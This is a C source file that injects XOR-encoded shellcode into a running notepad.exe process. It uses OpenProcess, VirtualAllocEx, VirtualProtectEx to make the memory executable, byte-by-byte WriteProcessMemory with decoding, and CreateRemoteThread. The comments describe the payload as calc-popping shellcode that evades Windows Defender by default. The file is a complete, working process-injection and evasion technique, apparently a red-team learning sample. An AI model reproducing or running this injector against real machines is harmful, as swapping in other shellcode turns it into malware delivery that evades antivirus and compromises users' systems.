// remoteinjection.c
// This hasn't had anythong implemented to bypass edr hooks just simple
// shellcode injection into process using calc 64 bit shellcode that bypasses defender by default to pop calc
// https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode/blob/main/win-x64-DynamicKernelWinExecCalc.asm
#include "windows.h"
#include <stdio.h>
#include <tlhelp32.h>

DWORD FindNotepadProcessAddress(const wchar_t* procName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("Error creating process snapshot: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &processEntry)) {
        CloseHandle(snapshot);
        printf("Error getting process entry: %lu\n", GetLastError());
        return 0;
    }

    do {
        if (wcscmp(processEntry.szExeFile, procName) == 0) {
            CloseHandle(snapshot);
            return (DWORD)processEntry.th32ProcessID;
        }
    } while (Process32Next(snapshot, &processEntry));

    CloseHandle(snapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    unsigned char s_code[] = "\x09\x70\xbe\x09\xb6\xa6\x24\x09\xca\x19\x21\x09\xca\x1a\x59\x09\xca\x1a\x61\x09\xca\x5a\x09\xca\x5a\x09\xca\x1a\x61"
        "\x08\xc8\x99\xca\x1a\x7d\x0d\x40\x82\x09\x70\x88\x27\xc0\x80\xbe\xc9\x09\x80\xa8\x49\xca\x55\x4a\x0d\x40\x83\x0c\x70"
        "\x93\x05\xca\x13\x5d\x0c\x40\x83\x0c\x70\x9a\x05\xca\x1b\x61\x0c\x40\x82\x0c\x70\xa5\x05\xca\x23\x65\x0c\x40\x85\xaa"
        "\x73\x1a\x18\x09\x70\x81\x09\xc8\xa3\x10\x09\xca\x4d\x65\x09\x70\xbe\x00\xca\x7d\xc2\x0d\x40\x86\x09\xc8\x97\xb2\xe7"
        "\x35\x44\x09\xbe\x81\xaa\xa7\x18\x27\x00\xca\x45\x05\x00\xca\x45\xc3\x0d\x40\x81\x12\x82\x09\x70\x88\xc1\x80\x46\x09"
        "\xf9\x4e\xe9\xd7\xd0\xfb\xc6\xdb\xdd\x09\xb6\x91\x09\x80\xa9\x49\x11\x10\xa9\xf1\xbe\xbe\xbe\x08\xc8\x87\x09\x70\x88"
        "\x09\xb6\xa0\x11\x09\xf9\xdd\xdf\xd2\xdd\x90\xdb\xc6\xdb\x09\xb6\x91\x11\x09\xc8\xa0\x09\xbe\x83\x09\xc2\xad\x61\x00"
        "\xbe\x97"; //shellcode

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;


    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindNotepadProcessAddress(L"notepad.exe"));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof s_code, (MEM_RESERVE | MEM_COMMIT), PAGE_NOACCESS);
    DWORD oldProtect;
    VirtualProtectEx(processHandle, remoteBuffer, sizeof s_code, PAGE_EXECUTE_READWRITE, &oldProtect);
    // decrypt
    for (int i = 0; i < sizeof s_code; i++) {
        // (((char *)(s_code + i)) )
        char dec_byte = s_code[i] ^ 0x41;
        WriteProcessMemory(processHandle, (BYTE*)remoteBuffer + i, &dec_byte, 1, NULL);
    }
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;
}